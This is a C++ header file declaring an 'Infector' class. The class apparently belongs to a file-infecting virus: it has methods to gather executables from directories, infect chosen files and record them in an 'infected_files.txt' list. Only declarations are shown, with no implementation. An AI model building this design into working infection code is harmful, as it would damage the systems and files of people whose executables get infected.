#pragma once
#include "stdafx.h"

class Infector
{
public:
	Infector(int f) : number_of_files(f) {};

	void files_to_infect();
	std::filesystem::path get_path_by_index(int index);
	bool file_already_running(std::filesystem::path p);
	void infect_specific_file(std::filesystem::path p,int i);
	void write_file(std::filesystem::path p);
	void infect_files();
	std::filesystem::path return_path_by_index(int i);
private:
	void add_to_infected(std::filesystem::path p);
	void add_to_infected(std::filesystem::path p,int i);
	bool file_exists(std::filesystem::path p);
	void read_file(std::filesystem::path p);
	void get_exes(std::vector<std::filesystem::path>& dir_paths, std::vector<std::pair<std::filesystem::path, int>>& exe_paths);
	std::string get_exe_name(const std::filesystem::path& p) const;


	std::filesystem::path path_to_file = "infected_files.txt";
	int number_of_files = 0;
	std::vector<std::pair<std::filesystem::path, int>> infected_files;
	std::filesystem::path file_path = "infected_files.txt";
};